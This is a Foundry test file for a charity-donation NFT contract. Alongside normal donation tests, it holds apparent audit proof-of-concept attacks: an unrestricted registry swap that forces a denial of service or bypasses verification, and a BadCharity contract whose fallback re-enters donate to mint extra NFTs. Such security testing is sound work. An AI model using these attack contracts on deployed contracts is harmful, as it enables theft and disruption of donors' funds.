// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../GivingThanks.sol";
import "../CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

contract GivingThanksTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    function testDonate() public {
        uint256 donationAmount = 1 ether;

        // Check initial token counter
        uint256 initialTokenCounter = charityContract.tokenCounter();

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity
        vm.prank(donor);
        charityContract.donate{ value: donationAmount }(charity);

        // Check that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);
        charityContract.tokenURI(initialTokenCounter);
        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, donationAmount);
    }

    function testCannotDonateToUnverifiedCharity() public {
        address unverifiedCharity = address(0x4);

        // Unverified charity registers but is not verified
        vm.prank(unverifiedCharity);
        registryContract.registerCharity(unverifiedCharity);

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor tries to donate to unverified charity
        vm.prank(donor);
        vm.expectRevert();
        charityContract.donate{ value: 1 ether }(unverifiedCharity);
    }

    function testFuzzDonate(uint96 donationAmount) public {
        // Limit the donation amount to a reasonable range
        donationAmount = uint96(bound(donationAmount, 1 wei, 10 ether));

        // Fund the donor
        vm.deal(donor, 20 ether);

        // Record initial balances
        uint256 initialTokenCounter = charityContract.tokenCounter();
        uint256 initialCharityBalance = charity.balance;

        // Donor donates to the charity
        vm.prank(donor);
        charityContract.donate{ value: donationAmount }(charity);

        // Verify that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, initialCharityBalance + donationAmount);
    }

    function testRegisteredCharitiesReceiveDonations() public {
        address anyCharity = makeAddr("anyCharity");

        registryContract.registerCharity(anyCharity);
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        charityContract.donate{ value: 1 ether }(anyCharity);

        assertEq(anyCharity.balance, 1 ether);
    }

    function testImpededDonations() public {
        // run setUp which deploys as follows
        // new GivingThanks(address(registryContract));
        vm.deal(donor, 10 ether);
        vm.expectRevert();
        vm.prank(donor);
        charityContract.donate{ value: 1 ether }(charity);
    }

    function testRegistryUpdateDOS() public {
        RegistryDOS badRegistry = new RegistryDOS();
        charityContract.updateRegistry(address(badRegistry));
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        vm.expectRevert(bytes("Charity not verified"));
        charityContract.donate{ value: 1 ether }(charity);
    }

    function testRegistryUpdateReentrancy() public {
        BadCharity badCharity = new BadCharity(address(charityContract));

        RegistryBypasser badRegistry = new RegistryBypasser();
        charityContract.updateRegistry(address(badRegistry));
        //donor or attacker the bad charity will mint N tokens anyways.
        vm.deal(donor, 1 ether);
        vm.prank(donor);
        charityContract.donate{ value: 0 }(address(badCharity));
    }
}

contract RegistryDOS {
    function isVerified(address) public pure returns (bool) {
        return false;
    }
}

contract RegistryBypasser {
    function isVerified(address) public pure returns (bool) {
        return true;
    }
}

contract BadCharity {
    uint256 times;
    GivingThanks protocol;

    constructor(address _protocol) {
        protocol = GivingThanks(_protocol);
    }

    fallback() external payable {
        //desired times
        if (times < 10) {
            times = times + 1;
            protocol.donate{ value: 0 }(address(this));
        }
    }
}
